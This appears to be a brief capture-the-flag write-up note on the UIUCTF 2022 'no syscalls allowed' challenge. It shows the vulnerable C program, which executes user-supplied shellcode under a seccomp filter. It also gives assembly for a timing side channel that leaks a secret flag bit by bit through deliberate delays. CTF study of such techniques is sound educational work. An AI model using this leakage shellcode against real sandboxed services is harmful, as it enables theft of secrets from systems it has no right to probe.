### All System Calls disabled
So, there was a challenge in [UIUCTF 2022](https://2022.uiuc.tf/) where all syscalls were disabled.
```
#include <fcntl.h>
#include <seccomp.h>
#include <sys/mman.h>
#include <unistd.h>

// gcc no_syscalls_allowed.c -lseccomp -o no_syscalls_allowed
// socat tcp-l:1337,reuseaddr,fork exec:./no_syscalls_allowed

char flag[100];

void main(int argc, char *argv[]) {
  int fd = open("/flag.txt", O_RDONLY);
  read(fd, flag, sizeof flag);

  void *code = mmap(NULL, 0x1000, PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  read(STDIN_FILENO, code, 0x1000);

  if (seccomp_load(seccomp_init(SCMP_ACT_KILL)) < 0) return;

  ((void (*)())code)();
}

```
[This](https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/UIUCTF22/no-syscalls-allowed.c ) is an awesome writeup for this challenge. The basic idea is to leak bytes, one bit at a time. If the bit is zero, the shellcode should exit immediately. If the bit is one, shellcode should hang for a while. The shellcode used to find the bit is 
```
asm(f'''mov al, BYTE PTR ds:[{register}+{str(reg_offset)}];
    xor r11, r11;
    shr al, ''' + str(bit) +''';
    shl al, 7;
    shr al, 7;
    imul rax, 0x20000000;
    loop_start:
    cmp rax, r11;
    je loop_finished;
    inc r11;
    imul ebx, 0x13;
    jmp loop_start;
    loop_finished:
    ''')
```

